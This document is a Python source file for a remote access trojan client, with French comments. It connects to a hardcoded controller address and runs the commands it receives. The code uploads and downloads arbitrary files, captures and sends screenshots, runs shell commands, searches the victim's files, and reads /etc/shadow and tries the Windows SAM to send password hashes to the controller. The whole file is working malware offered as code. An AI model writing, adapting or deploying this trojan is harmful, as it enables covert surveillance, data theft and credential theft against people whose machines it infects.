import socket
import os
import platform
import subprocess
import sys
import glob
import pyautogui
from PIL import Image
import random

GENERIC_READ = -2147483648 # Constante  utilisée pour spécifier des droits de lecture génériques lors de l'ouverture d'un fichier
FILE_SHARE_WRITE = 2 # constante qui indique que le fichier peut être ouvert pour écriture par d'autres processus simultanément
FILE_SHARE_READ = 1 # constante qui indique que le fichier peut être ouvert pour lecture par d'autres processus simultanément.
FILE_SHARE_DELETE = 4 # Constante qui indique que le fichier peut être supprimé par d'autres processus simultanément
CREATE_ALWAYS = 2 # Constante qui est utilisée pour spécifier que le fichier doit être créé, même s'il existe déjà

class RAT_CLIENT: 
    def __init__(self, ip, port):    # Definition du constructeur de notre Classe , on initialise l'attribut ip et port  de l'objet avec la valeur passée en argument
        self.ip = ip
        self.port = port


    def build_connection(self): # Methode chargé de creer un socket , afin d'etablir une connexin TCP avec le serveur 
        global client
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((self.ip, self.port))
        sending = socket.gethostbyname(socket.gethostname()) #Recupere l'IP de la machine 
        client.send(sending.encode())
        

    
    def execution(self) :
       while True :
        command = client.recv(1024).decode() # cette ligne de code reçoit des données depuis le serveur , les décode en une chaîne de caractères et les assigne à la variable command
        
        if command == 'upload':  # Upload d'un fichier vers le client
            filename = client.recv(6000) #Le client reçoit le nom du fichier  du serveur. 
            newfile = open(filename, 'wb')# Ici le client ouvre un nouveau fichier avec le nom spécifié par filename en mode écriture binaire
            data = client.recv(6000) # Le client reçoit les données du fichier envoyées par le serveur
            newfile.write(data) # Le client  écrit les données reçues dans le fichier ouvert précédemment
            newfile.close()
        elif command[:8] == 'download':
                    
            file = open (command.split(" ")[1], 'rb')  # Ouverture d'un fichier en mode lecture 
            data = file.read() #lecture  du  contenu du fichier dans la variable data.
            client.sendall(data) # Envoi des donnees 
        elif command == 'screenshot': 
            try:
                file = f'{random.randint(111111, 444444)}.jpeg' # Generation de nom de fichier aleatoire avec l'extension .jpeg
                file2 = f'{random.randint(555555, 999999)}.jpeg'
                pyautogui.screenshot(file) # Effectuer une capture d'ecran et l'enregistrer dans le premier fichier 
                image = Image.open(file) #Ouverture de l'image capture
                new_image = image.resize((1280, 800)) # Redimensionnement de l'image 
                new_image.save(file2) # Sauvegarde de l'image 
                with open(file2, 'rb') as img_file:
                    data = img_file.read()
                    client.sendall(data) # Envoi du contenu du fichier 

            except Exception as e:

                print("Error capturing screenshot:", str(e))

        elif command.startswith("ipconfig") :  # Commande permettant d'obtenir les parametres reseau de la cible Windows 
            result = subprocess.run(command, shell=True, capture_output= True, text=True) # Execution de la commande via un sous-processus et capturer la sortie 
            print(result.stdout) 
            client.sendall((result.stdout).encode('utf-8'))
           #pour un client linux 
        elif command.startswith("ifconfig") :
            result = subprocess.run(command, shell=True, capture_output= True, text=True)
            print(result.stdout)
            client.sendall((result.stdout).encode('utf-8'))
            
        elif command == 'exit':
            sys.exit()  
        
        elif command.startswith("find") : # Commande pour effectuer la recherche d'un fichier ou d'un document 
            result = subprocess.run(command, shell=True, capture_output= True, text=True)
            print(result.stdout)
            client.sendall(result.stdout.encode('utf-8'))
           
        elif command[:6] == "search":  
            repertoire_recherche, extension = command.split(" ")
            for x in glob.glob(os.path.join(repertoire_recherche, '**', '*'), recursive=True):
                if x.endswith(extension):
                    chemin_absolu = os.path.abspath(x)
                    client.sendall(str(chemin_absolu).encode())  
        elif command == 'pwd': # Commande pour avoir le repertoire courant 
            curdir = str(os.getcwd())
            print(curdir)
            client.sendall(curdir.encode('utf-8'))
        elif command == 'ls': # Commande pour lister le contenu  d'un repertoire sous linux 
            result = subprocess.run(command, shell=True, capture_output= True, text=True)
            print(result.stdout)
            client.sendall((result.stdout).encode('utf-8'))
        elif command[:2] == 'cd': #Commande pour changer de repertoire 
            new_directory = command[2:].strip()
          
            os.chdir(new_directory)
            #current_directory = os.getcwd()
            #print(new_directory)
            client.sendall(new_directory.encode())
            #output = subprocess.getoutput(command)
            #client.sendall(output.encode())
        elif command == 'cd ..':
            os.chdir('..')
            curdir = str(os.getcwd())
            client.sendall(curdir.encode('utf-8'))
        elif command == 'dir':    # Afficher une Liste des fichiers et des repertoires  
            output = subprocess.check_output(["dir"], shell=True)
            output = output.decode('utf8', errors='ignore')
            client.sendall(output.encode())
        elif command == 'hashdump': # Commande pour executer le hashdump sur linux 
            with open('/etc/shadow', 'rb') as file: #Ouverture du fichier etc/shaddow en mode lecture 
                data = file.read()  # Lecture du contenu du  fichier
                client.sendall(b'hashdump') 
                client.sendall(data) 
               #pour un client windows 
        elif command =='samdump':
            with open('HKEY_LOCAL_MACHINE\SAM sam', 'rb') as file:
                data = file.read()
                client.sendall(b'samdump')
                client.sendall(data)

    
rat = RAT_CLIENT('192.168.1.20', 12345)

if __name__ == '__main__': # Verification du script , afin de savoir s'il est execute en mode principal
    rat.build_connection() # Etablir une connection
    while True:
        try:
            rat.execution()
        except Exception as e:
            print("An error occurred:", str(e))
    